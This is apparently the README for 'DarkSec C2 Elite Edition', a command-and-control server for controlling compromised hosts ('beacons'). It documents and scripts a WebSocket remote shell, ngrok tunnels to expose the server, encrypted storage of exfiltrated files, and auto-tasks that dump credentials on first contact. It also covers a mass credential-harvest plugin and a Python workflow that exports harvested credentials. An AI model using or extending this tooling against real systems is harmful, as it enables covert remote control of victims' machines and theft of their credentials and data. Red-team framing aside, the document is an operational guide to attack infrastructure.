# DarkSec C2 Server - Elite Edition

## 🎯 Overview

The Elite Edition of DarkSec C2 Server includes **12 advanced features** that transform it into an enterprise-grade command and control infrastructure suitable for sophisticated red team operations.

---

## 🚀 Quick Start

### Installation

```bash
# Install required dependencies
pip install -r requirements.txt

# Or install manually
pip install flask flask-sock cryptography pyngrok requests
```

### Basic Usage

```bash
# Standard HTTP server
python c2_server_enhanced.py --host 0.0.0.0 --port 8443

# With SSL/TLS (HTTPS)
python c2_server_enhanced.py --ssl --port 443

# With Ngrok tunnel
python c2_server_enhanced.py --ngrok --ngrok-token YOUR_NGROK_TOKEN

# Full enterprise mode (SSL + Ngrok)
python c2_server_enhanced.py --ssl --ngrok --ngrok-token YOUR_TOKEN
```

---

## 📋 12 Advanced Features

### 1. SSL/TLS Encryption 🔒

**Description:** Secure HTTPS communications with auto-generated self-signed certificates.

**Features:**
- Automatic certificate generation on first run
- RSA 2048-bit encryption
- Valid for 365 days
- Files: `cert.pem` and `key.pem`

**Usage:**
```bash
python c2_server_enhanced.py --ssl --port 443
```

**Technical Details:**
- Uses cryptography library
- Subject: CN=darksec.local, O=DarkSec
- SHA256 signature algorithm

---

### 2. Ngrok Integration 🌐

**Description:** Create public tunnels for remote C2 access without port forwarding.

**Features:**
- Automatic tunnel creation
- Auth token support
- Public URL extraction
- Graceful shutdown

**Usage:**
```bash
# Get ngrok token from https://ngrok.com
python c2_server_enhanced.py --ngrok --ngrok-token YOUR_TOKEN
```

**API Response:**
```
[*] Ngrok tunnel active: https://abc123.ngrok.io
```

---

### 3. WebSocket Real-time Shell ⚡

**Description:** Bidirectional real-time shell for instant command execution.

**Endpoint:** `ws://server:port/ws/shell/<beacon_id>`

**Protocol:**
```javascript
// Authentication (first message)
ws.send(JSON.stringify({
    api_key: "YOUR_API_KEY"
}));

// Send command
ws.send(JSON.stringify({
    command: "whoami"
}));

// Receive response
{
    "command_id": 123,
    "status": "queued"
}
```

**Example Client:**
```javascript
const ws = new WebSocket('ws://localhost:8443/ws/shell/beacon123');

ws.onopen = () => {
    // Authenticate
    ws.send(JSON.stringify({api_key: 'YOUR_KEY'}));
    
    // Send command
    ws.send(JSON.stringify({command: 'dir C:\\'}));
};

ws.onmessage = (event) => {
    console.log('Response:', JSON.parse(event.data));
};
```

---

### 4. File Compression/Encryption 🔐

**Description:** Automatic encryption and compression of all exfiltrated data.

**Encryption:** Fernet (symmetric encryption)  
**Compression:** gzip

**Features:**
- Transparent encryption/decryption
- Automatic key generation
- Key persistence in `encryption_key.bin`
- Compress before encrypt for efficiency

**Storage:**
- All exfil data is stored encrypted in database
- Encryption key is auto-generated and saved
- Decryption available via API

**Key Management:**
```python
# Key is automatically managed
# Located at: ./encryption_key.bin
# Backup this file for data recovery!
```

---

### 5. Beacon Grouping/Tagging System 🏷️

**Description:** Organize beacons by campaigns, targets, or custom categories.

**API Endpoints:**

**Update Beacon Tags:**
```bash
POST /api/beacon/<beacon_id>/tags
Authorization: X-API-Key: YOUR_KEY

{
    "tags": "campaign1,target_finance,priority_high"
}
```

**Filter Beacons by Tags:**
```bash
GET /api/beacons?tags=campaign1&active=true
Authorization: X-API-Key: YOUR_KEY
```

**Example Usage:**
```python
import requests

headers = {'X-API-Key': 'YOUR_KEY'}

# Tag a beacon
requests.post(
    'http://localhost:8443/api/beacon/abc123/tags',
    json={'tags': 'phishing,executives,phase2'},
    headers=headers
)

# Get all beacons with specific tag
resp = requests.get(
    'http://localhost:8443/api/beacons?tags=phase2',
    headers=headers
)
beacons = resp.json()['beacons']
```

---

### 6. Command History Viewer 📊

**Description:** Complete audit trail of all commands executed on each beacon.

**API Endpoint:**
```bash
GET /api/beacon/<beacon_id>/history?limit=50
Authorization: X-API-Key: YOUR_KEY
```

**Response:**
```json
{
    "history": [
        {
            "id": 123,
            "command": "whoami",
            "timestamp": "2025-10-31T22:00:00",
            "status": "completed",
            "result": "DESKTOP-ABC\\user",
            "operator": "admin"
        }
    ]
}
```

**Features:**
- Tracks operator who sent command
- Full command and result storage
- Timestamp tracking
- Configurable history limit

---

### 7. Auto-Tasking on Registration 🤖

**Description:** Automatically execute commands when new beacons register.

**Create Auto-Task:**
```bash
POST /api/auto-tasks
Authorization: X-API-Key: YOUR_KEY

{
    "name": "Initial Recon",
    "command": "SYSINFO:full",
    "trigger": "on_register"
}
```

**List Auto-Tasks:**
```bash
GET /api/auto-tasks
Authorization: X-API-Key: YOUR_KEY
```

**Use Cases:**
- Automatic system information gathering
- Initial screenshot capture
- Credential dump on first contact
- Network reconnaissance

**Example:**
```python
import requests

headers = {'X-API-Key': 'YOUR_KEY'}

# Create auto-task for screenshots
requests.post(
    'http://localhost:8443/api/auto-tasks',
    json={
        'name': 'Auto Screenshot',
        'command': 'SCREENSHOT:capture',
        'trigger': 'on_register'
    },
    headers=headers
)
```

---

### 8. Beacon Health Monitoring 💚

**Description:** Automated background monitoring of beacon health status.

**Health States:**
- **healthy** (green): Last seen < 5 minutes ago
- **warning** (yellow): Last seen 5-10 minutes ago
- **dead** (red): Last seen > 10 minutes ago

**Features:**
- Background thread checks every 30 seconds
- Automatic status updates
- Visual indicators in web UI
- Health status in API responses

**API Response:**
```json
{
    "beacons": [
        {
            "id": "abc123",
            "hostname": "TARGET-PC",
            "health": "healthy"
        }
    ]
}
```

---

### 9. Data Export Functionality 📤

**Description:** Export beacons, credentials, and other data to CSV/JSON.

**API Endpoint:**
```bash
GET /api/export/<data_type>?format=csv
Authorization: X-API-Key: YOUR_KEY
```

**Supported Data Types:**
- `beacons` - All beacon information
- `commands` - Command history
- `credentials` - Harvested credentials
- `exfil_data` - Exfiltrated files metadata

**Formats:**
- `csv` - Comma-separated values (downloadable file)
- `json` - JSON array (API response)

**Example:**
```bash
# Export all credentials to CSV
curl -H "X-API-Key: YOUR_KEY" \
    "http://localhost:8443/api/export/credentials?format=csv" \
    -o credentials_export.csv

# Export beacons to JSON
curl -H "X-API-Key: YOUR_KEY" \
    "http://localhost:8443/api/export/beacons?format=json"
```

---

### 10. Multi-User Support 🔐

**Description:** Role-based access control with multiple operator support.

**Roles:**
- **admin** - Full access to all operations
- **operator** - Standard operations (read, write)
- **viewer** - Read-only access

**Permissions:**
- `read` - View beacons, commands, data
- `write` - Send commands, manage beacons
- `delete` - Remove data
- `export` - Export data
- `manage_users` - Create/manage users

**Create User:**
```bash
POST /api/users/create
Authorization: X-API-Key: ADMIN_KEY

{
    "username": "operator1",
    "role": "operator",
    "permissions": "read,write"
}
```

**Response:**
```json
{
    "status": "success",
    "username": "operator1",
    "api_key": "NEW_API_KEY_HERE"
}
```

**Example:**
```python
import requests

admin_headers = {'X-API-Key': 'ADMIN_KEY'}

# Create operator user
resp = requests.post(
    'http://localhost:8443/api/users/create',
    json={
        'username': 'red_team_op1',
        'role': 'operator',
        'permissions': 'read,write,export'
    },
    headers=admin_headers
)

new_key = resp.json()['api_key']
print(f"New operator key: {new_key}")
```

---

### 11. Listener Profiles 📡

**Description:** Support for multiple listener configurations and campaigns.

**Database Table:** `listener_profiles`

**Schema:**
```sql
CREATE TABLE listener_profiles (
    id INTEGER PRIMARY KEY,
    profile_name TEXT UNIQUE,
    port INTEGER,
    protocol TEXT,
    enabled BOOLEAN,
    metadata TEXT,
    created TIMESTAMP
);
```

**Use Cases:**
- Separate listeners per campaign
- Different ports for different target environments
- Protocol-specific configurations
- Campaign isolation

---

### 12. Plugin System 🧩

**Description:** Extensible architecture for custom C2 functionality.

**Built-in Plugins:**
- `mass_screenshot` - Capture screenshots from all beacons
- `credential_harvest` - Dump credentials from all beacons

**Create Custom Plugin:**
```python
from c2_server_enhanced import register_plugin

@register_plugin('custom_recon')
def custom_recon(server, data):
    """Custom reconnaissance plugin"""
    target_tag = data.get('tag', 'all')
    
    # Get beacons with specific tag
    beacons = server.db.get_beacons(tags=target_tag)
    
    # Send custom commands
    count = 0
    for beacon in beacons:
        beacon_id = beacon[0]
        server.db.add_command(beacon_id, 'NETWORK:scan:192.168.1.0/24', 'plugin')
        count += 1
    
    return f'Recon initiated on {count} beacons'
```

**Execute Plugin:**
```bash
POST /api/plugins/mass_screenshot
Authorization: X-API-Key: YOUR_KEY

{}
```

**List Available Plugins:**
```bash
GET /api/plugins
Authorization: X-API-Key: YOUR_KEY
```

**Response:**
```json
{
    "plugins": [
        "mass_screenshot",
        "credential_harvest",
        "custom_recon"
    ]
}
```

---

## 🔧 Configuration

### Environment Variables

```bash
# Ngrok configuration
export NGROK_AUTHTOKEN=your_token_here

# Database path
export C2_DATABASE_PATH=/opt/c2/data.db

# SSL certificate paths
export C2_SSL_CERT=/etc/c2/cert.pem
export C2_SSL_KEY=/etc/c2/key.pem
```

### Command-Line Arguments

```bash
python c2_server_enhanced.py \
    --host 0.0.0.0 \
    --port 8443 \
    --ssl \
    --ngrok \
    --ngrok-token YOUR_TOKEN \
    --db /path/to/database.db
```

---

## 📊 Comparison: Standard vs Elite Edition

| Feature | Standard | Elite |
|---------|----------|-------|
| API Endpoints | 25+ | 30+ |
| Database Tables | 10 | 15+ |
| SSL/TLS | ❌ | ✅ |
| Ngrok Integration | ❌ | ✅ |
| WebSocket Shell | ❌ | ✅ |
| Data Encryption | ❌ | ✅ (Fernet + gzip) |
| Multi-User | ❌ | ✅ (RBAC) |
| Command History | Basic | ✅ Full with operators |
| Beacon Tagging | ❌ | ✅ |
| Health Monitoring | ❌ | ✅ Automated |
| Auto-Tasking | ❌ | ✅ |
| Data Export | ❌ | ✅ CSV/JSON |
| Plugin System | ❌ | ✅ |

---

## 🛡️ Security Best Practices

### 1. API Key Management
```bash
# Store master key securely
echo "YOUR_MASTER_KEY" > ~/.c2_master_key
chmod 600 ~/.c2_master_key

# Use environment variable
export C2_API_KEY=$(cat ~/.c2_master_key)
```

### 2. SSL/TLS in Production
```bash
# Use Let's Encrypt for production
certbot certonly --standalone -d c2.yourdomain.com

# Point to certificates
python c2_server_enhanced.py \
    --ssl \
    --cert /etc/letsencrypt/live/c2.yourdomain.com/fullchain.pem \
    --key /etc/letsencrypt/live/c2.yourdomain.com/privkey.pem
```

### 3. Ngrok Authentication
```bash
# Always use auth token
python c2_server_enhanced.py \
    --ngrok \
    --ngrok-token YOUR_TOKEN

# Consider ngrok paid plans for:
# - Custom domains
# - Reserved TCP addresses
# - IP whitelisting
```

### 4. Database Security
```bash
# Encrypt database file
cryptsetup luksFormat /dev/sdb1
cryptsetup open /dev/sdb1 c2_data

# Use encrypted filesystem
python c2_server_enhanced.py --db /encrypted/c2_data.db
```

### 5. Network Security
```bash
# Firewall rules
ufw allow 443/tcp  # HTTPS only
ufw enable

# Use VPN for operator access
openvpn --config operator.ovpn
```

---

## 📖 API Examples

### Complete Workflow Example

```python
import requests
import json

# Configuration
C2_URL = "https://localhost:8443"
API_KEY = "YOUR_MASTER_KEY"
headers = {'X-API-Key': API_KEY}

# 1. Create auto-task for new beacons
requests.post(
    f"{C2_URL}/api/auto-tasks",
    json={
        'name': 'Initial Survey',
        'command': 'SYSINFO:full',
        'trigger': 'on_register'
    },
    headers=headers
)

# 2. Wait for beacons to register...
# (beacons will auto-execute SYSINFO on registration)

# 3. List all beacons
beacons = requests.get(f"{C2_URL}/api/beacons", headers=headers).json()

for beacon in beacons['beacons']:
    beacon_id = beacon['id']
    
    # 4. Tag beacon
    requests.post(
        f"{C2_URL}/api/beacon/{beacon_id}/tags",
        json={'tags': 'campaign1,priority_high'},
        headers=headers
    )
    
    # 5. View command history
    history = requests.get(
        f"{C2_URL}/api/beacon/{beacon_id}/history",
        headers=headers
    ).json()
    
    print(f"Beacon {beacon_id} command history:")
    for cmd in history['history']:
        print(f"  [{cmd['timestamp']}] {cmd['command']} -> {cmd['status']}")

# 6. Execute mass operation via plugin
requests.post(
    f"{C2_URL}/api/plugins/mass_screenshot",
    headers=headers
)

# 7. Export credentials
resp = requests.get(
    f"{C2_URL}/api/export/credentials?format=json",
    headers=headers
)
credentials = resp.json()['data']

print(f"\nHarvested {len(credentials)} credentials")

# 8. Create operator user
new_user = requests.post(
    f"{C2_URL}/api/users/create",
    json={
        'username': 'operator2',
        'role': 'operator',
        'permissions': 'read,write'
    },
    headers=headers
).json()

print(f"\nNew operator created: {new_user['username']}")
print(f"API Key: {new_user['api_key']}")
```

---

## 🐛 Troubleshooting

### Issue: SSL Certificate Error
```bash
# Regenerate certificates
rm cert.pem key.pem
python c2_server_enhanced.py --ssl
```

### Issue: Ngrok Tunnel Not Starting
```bash
# Check ngrok installation
ngrok version

# Test manually
ngrok http 8443

# Check token
ngrok authtoken YOUR_TOKEN
```

### Issue: WebSocket Connection Failed
```bash
# Check flask-sock installation
pip install flask-sock

# Verify endpoint
curl -i -N -H "Connection: Upgrade" \
     -H "Upgrade: websocket" \
     -H "X-API-Key: YOUR_KEY" \
     http://localhost:8443/ws/shell/beacon123
```

### Issue: Permission Denied for API
```bash
# Check user permissions
# Only admin can create users and export data
# Operators can read/write
# Viewers can only read
```

---

## 📝 Changelog

### v2.0 - Elite Edition
- ✅ Added SSL/TLS encryption
- ✅ Added Ngrok integration
- ✅ Added WebSocket real-time shell
- ✅ Added file compression/encryption
- ✅ Added beacon tagging system
- ✅ Added command history viewer
- ✅ Added auto-tasking
- ✅ Added health monitoring
- ✅ Added data export
- ✅ Added multi-user support
- ✅ Added listener profiles
- ✅ Added plugin system

---

## 🎓 Training Resources

### Example Scenarios

1. **Red Team Engagement**
   - Use auto-tasks for initial recon
   - Tag beacons by department
   - Use health monitoring to track active targets
   - Export data for reports

2. **Penetration Testing**
   - SSL/TLS for secure comms
   - Multi-user for team collaboration
   - Command history for documentation
   - Plugin system for custom tests

3. **Security Research**
   - WebSocket for real-time testing
   - Data export for analysis
   - Encrypted exfil for testing detection
   - Health monitoring for persistence testing

---

## 📞 Support

For issues, questions, or feature requests:
- GitHub Issues: https://github.com/darksec/nightblade/issues
- Discord: https://discord.gg/darksec
- Email: support@darksec-nightblade.com

---

**DarkSec C2 Elite Edition v2.0**  
*Enterprise-Grade Command & Control Infrastructure*  
⚔️ The blade that cuts through digital darkness ⚔️
